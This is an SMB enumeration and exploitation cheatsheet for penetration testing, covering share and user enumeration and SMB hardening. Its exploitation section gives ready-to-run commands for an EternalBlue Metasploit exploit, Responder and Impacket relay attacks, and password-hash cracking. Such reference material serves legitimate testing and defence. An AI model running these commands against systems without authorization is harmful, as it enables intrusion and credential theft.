Below is a comprehensive cheatsheet for **SMB (Server Message Block) Enumeration and Exploitation** based on the notes content. This cheatsheet includes key commands, options, and explanations for each entry, organized for easy reference.

---

**SMB Enumeration and Exploitation Cheatsheet**

### **1. SMB Enumeration**

#### **Basic Share Enumeration**
- **Command:** `smbclient -L //target_ip`
- **Explanation:** Lists all SMB shares available on the target. Replace `target_ip` with the IP address of the SMB server.

#### **Connect to a Share**
- **Command:** `smbclient //target_ip/share_name -U username`
- **Explanation:** Connects to a specific SMB share using provided credentials. Replace `share_name` with the name of the share and `username` with the SMB username.

#### **Enumerate SMB Users (using enum4linux)**
- **Command:** `enum4linux -u username -p password target_ip`
- **Explanation:** Enumerates users from the SMB server. Replace `username` and `password` with credentials and `target_ip` with the target's IP address.

#### **Enumerate SMB Users (using nmap)**
- **Command:** `nmap -p 445 --script smb-enum-users.nse target_ip`
- **Explanation:** Uses Nmap to enumerate SMB users by running the `smb-enum-users` script. Replace `target_ip` with the target's IP address.

#### **List Shares and Permissions (using smbmap)**
- **Command:** `smbmap -H target_ip -u username -p password`
- **Explanation:** Lists all shares and their permissions on the target server. Replace `username` and `password` with valid credentials and `target_ip` with the target's IP address.

### **2. SMB Exploitation Techniques**

#### **Exploit EternalBlue (MS17-010)**
- **Command:** `msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target_ip; exploit"`
- **Explanation:** Uses Metasploit to exploit the EternalBlue vulnerability in SMB. Replace `target_ip` with the IP address of the vulnerable server.

#### **SMB Relay Attack (using Responder)**
- **Command:** `responder -I interface -wrf`
- **Explanation:** Starts Responder to listen for and relay SMB authentication requests. Replace `interface` with the network interface to listen on.

#### **SMB Relay Attack (using Impacket)**
- **Command:** `impacket-smbrelayx.py -t target_ip -s`
- **Explanation:** Uses Impacket to relay SMB authentication requests to a target server. Replace `target_ip` with the IP address of the target server.

#### **SMB Password Cracking (using John the Ripper)**
- **Command:** `john --wordlist=/path/to/wordlist.txt --format=NT hashfile.txt`
- **Explanation:** Cracks SMB password hashes using John the Ripper. Replace `/path/to/wordlist.txt` with the path to your wordlist and `hashfile.txt` with the file containing hashes.

### **3. SMB Configuration and Security**

#### **Enable SMB Signing**
- **Command:** `Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'RequireSecuritySignature' -Value 1`
- **Explanation:** Configures Windows to require SMB signing for increased security.

#### **Disable SMBv1 (on Windows)**
- **Command:** `Disable-WindowsOptionalFeature -Online -FeatureName FS-SMB1`
- **Explanation:** Disables SMBv1 on Windows to protect against vulnerabilities associated with this outdated protocol.

#### **Configure SMB Encryption**
- **Command:** `Set-SmbServerConfiguration -EncryptData 1`
- **Explanation:** Configures SMB server to encrypt data to protect against eavesdropping.

### **4. SMB Commands and Utilities**

#### **SMB Client Utility (smbclient)**
- **Command:** `smbclient //target_ip/share_name -U username`
- **Explanation:** Connects to an SMB share to interact with files. Useful for manual file access and exploration.

#### **SMB Map Utility (smbmap)**
- **Command:** `smbmap -H target_ip -u username -p password`
- **Explanation:** Provides a detailed view of SMB shares and permissions. Helpful for enumeration and understanding share configurations.

#### **Nmap SMB Scripts**
- **Command:** `nmap -p 445 --script smb* target_ip`
- **Explanation:** Runs all SMB-related scripts in Nmap against the target. Useful for a wide range of SMB-related checks and enumeration.

### **5. Common SMB Vulnerabilities**

#### **EternalBlue (MS17-010)**
- **Vulnerability:** A critical remote code execution vulnerability in SMBv1 that can allow attackers to execute arbitrary code on the target server.

#### **SMB Relay Attacks**
- **Vulnerability:** Exploits the lack of SMB signing to relay authentication requests between clients and servers, potentially leading to unauthorized access.

---
